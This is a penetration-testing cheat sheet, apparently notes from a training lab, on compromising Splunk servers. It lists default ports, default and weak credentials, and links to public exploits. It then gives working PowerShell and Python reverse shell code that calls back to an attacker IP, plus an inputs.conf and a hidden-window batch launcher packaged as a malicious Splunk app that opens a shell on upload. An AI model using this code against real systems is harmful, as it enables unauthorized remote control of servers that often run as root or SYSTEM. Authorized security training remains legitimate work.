# splunk
## important info !!!
it probably needs https when we try to load it in browser!!!!!  
## info
Splunk does not suffer from many exploitable vulnerabilities.  
The biggest focus of Splunk during an assessment would be weak or null authentication.  
Admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server.  
Often runs as root on Linux or SYSTEM on Windows systems in internal networks.  
While uncommon, we may encounter Splunk externally facing at times.  
The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication.  
It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about.  
Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts.  
As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts.  
Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system.  
## default port
The Splunk web server runs by default on port 8000.  
Port 8089, the Splunk management port for communication with the Splunk REST API.  
## default credentials
On older versions of Splunk, the default credentials are admin:changeme  
The latest version of Splunk sets credentials during the installation process.  
If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc.  
## public vulnerabilites
https://www.exploit-db.com/exploits/40895  
https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html  
## exploitation (if auth was successfull or no auth was needed)
https://github.com/0xjpuff/reverse_shell_splunk  
* First need to create a custom Splunk application using the following directory structure.
  * splunk_shell/
  * splunk_shell/bin
  * splunk_shell/default
* The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file.
* Our reverse shell will be a PowerShell one-liner.
* PS reverse shell code
<pre>
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</pre>
* The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present. More info here: https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf
* inputs.conf content:
<pre>
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
</pre>
* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
<pre>
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
</pre>
* Once the files are created, we can create a tarball or .spl file.
<pre>
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
</pre>
* https://10.129.139.196:8000/en-US/manager/search/apps/local
* Before uploading the malicious custom app, let's start a listener using Netcat or socat.
* Choose Install app from file and upload the application.
* On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
* As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled.
### linux exploitation
* If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
<pre>
import sys,socket,os,pty
ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
</pre>
